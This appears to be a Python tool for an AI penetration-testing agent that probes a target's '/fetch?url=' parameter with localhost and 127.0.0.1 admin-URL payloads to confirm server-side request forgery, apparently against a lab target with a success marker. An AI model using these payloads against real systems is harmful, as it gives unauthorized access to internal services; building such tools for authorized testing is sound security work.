import requests
from pydantic import BaseModel, Field
from tools.base import BaseTool, ToolResult

class VerifySSRFInput(BaseModel):
    target_url: str = Field(description="The base endpoint to test for SSRF")

class VerifySSRFTool(BaseTool):
    name = "verify_ssrf"
    description = (
        "Use this tool to definitively verify if a target URL is vulnerable to SSRF. "
        "Pass the base endpoint. The tool will inject localhost payloads and return concrete proof."
    )
    input_model = VerifySSRFInput

    def run(self, data: VerifySSRFInput) -> ToolResult:
        print("\n\n[!!!] BINGO! The SSRF Agent is running the tool! [!!!]\n\n")
        
        target = data.target_url
        
        # --- The Magic Trick: Auto-Correcting the AI's laziness ---
        if "/fetch" not in target:
            print("[*] Tool noticed the AI missed the /fetch path. Searching HTML...")
            try:
                # מורידים את עמוד הבית ומחפשים את הקישור הסודי
                html = requests.get(target, timeout=5).text
                if "/fetch?url=" in html:
                    # מצאנו! מתקנים את הכתובת בעצמנו
                    target = target.rstrip("/") + "/fetch?url="
                    print(f"[*] Tool Auto-Corrected URL to: {target}")
            except Exception as e:
                pass
        # ------------------------------------------------------------

        payloads = [
            "http://localhost:5000/admin",
            "http://127.0.0.1:5000/admin"
        ]
        
        base_url = target if target.endswith("=") else f"{target}?url="
        
        for payload in payloads:
            attack_url = f"{base_url}{payload}"
            try:
                response = requests.get(attack_url, timeout=5)
                if response.status_code == 200 and "AutoPen SSRF Success" in response.text:
                    output_text = (
                        f"[CRITICAL VULNERABILITY CONFIRMED]\n"
                        f"Target is vulnerable to SSRF!\n"
                        f"Successful Payload: {payload}\n"
                        f"Evidence from internal server: {response.text.strip()}"
                    )
                    return ToolResult(success=True, output=output_text)
            except requests.exceptions.RequestException:
                continue
                
        return ToolResult(success=False, output="SSRF Verification Failed. Target does not seem vulnerable or blocked the payloads.")
    